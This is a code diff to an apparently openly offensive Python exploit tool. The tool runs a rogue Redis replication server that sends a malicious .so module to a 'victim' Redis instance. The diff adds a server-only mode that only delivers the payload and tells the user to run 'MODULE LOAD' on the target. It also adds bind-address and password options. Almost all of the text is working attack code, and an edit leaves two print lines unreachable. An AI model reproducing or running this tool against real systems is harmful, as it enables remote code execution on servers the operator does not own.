@@ -112,7 +112,14 @@ def interact(remote):
     except KeyboardInterrupt:
         return
 
-def runserver(rhost, rport, lhost, lport, passwd):
+def runserver(rhost, rport, passwd, lhost, lport, bind_addr, server_only):
+    if server_only:
+        rogue = RogueServer(bind_addr, lport)
+        print('Waiting for connection...')
+        rogue.exp()
+        print('Payload sent.\nRun "MODULE LOAD /path/to/dbfile" on target redis server to enable the plugin.')
+        return
+
     # expolit
     remote = Remote(rhost, rport)
 
@@ -134,7 +141,7 @@ def runserver(rhost, rport, lhost, lport, passwd):
 
     # rend .so to victim
     sleep(2)
-    rogue = RogueServer(lhost, lport)
+    rogue = RogueServer(bind_addr, lport)
     rogue.exp()
     sleep(2)
 
@@ -157,17 +164,21 @@ if __name__ == '__main__':
             help="target host")
     parser.add_option("--rport", dest="rp", type="int",
             help="target redis port, default 6379", default=6379)
+    parser.add_option("--passwd", dest="rpasswd", type="string",
+            help="target redis password")
     parser.add_option("--lhost", dest="lh", type="string",
             help="rogue server ip")
     parser.add_option("--lport", dest="lp", type="int",
             help="rogue server listen port, default 21000", default=21000)
-    parser.add_option("--passwd", dest="passwd", type="string",
-            help="redis password")
+    parser.add_option("--bind", dest="bind_addr", type="string", default="0.0.0.0",
+            help="rogue server bind ip, default 0.0.0.0")
+    parser.add_option("--server-only", dest="server_only", action="store_true", default=False,
+            help="start rogue server only, no attack, default false")
 
     (options, args) = parser.parse_args()
-    if not options.rh or not options.lh:
+    if not options.server_only and (not options.rh or not options.lh):
         parser.error("Invalid arguments")
-    #runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
-    print("TARGET {}:{}".format(options.rh, options.rp))
-    print("SERVER {}:{}".format(options.lh, options.lp))
-    runserver(options.rh, options.rp, options.lh, options.lp, options.passwd)
+        print("TARGET {}:{}".format(options.rh, options.rp))
+        print("SERVER {}:{}".format(options.lh, options.lp))
+    print("BINDING {}:{}".format(options.bind_addr, options.lp))
+    runserver(options.rh, options.rp, options.rpasswd, options.lh, options.lp, options.bind_addr, options.server_only)
